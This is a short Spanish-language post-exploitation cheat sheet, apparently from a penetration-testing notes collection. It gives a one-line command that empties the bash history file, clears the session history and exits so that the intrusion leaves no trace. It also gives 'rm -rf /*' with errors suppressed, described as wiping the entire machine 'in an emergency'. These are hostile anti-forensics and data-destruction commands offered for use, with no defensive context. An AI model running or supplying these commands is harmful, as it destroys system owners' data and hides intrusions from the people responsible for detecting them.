## POST-EXPLOTACION

Cierra la sesión y borra todo el historial de comandos del bash history sin registrar exit al salir

``echo "" > ~/.bash_history && history -c && exit`` 

Borra toda la maquina, hacer solo en caso de emergencia

``(rm -rf /*) 2>/dev/null``

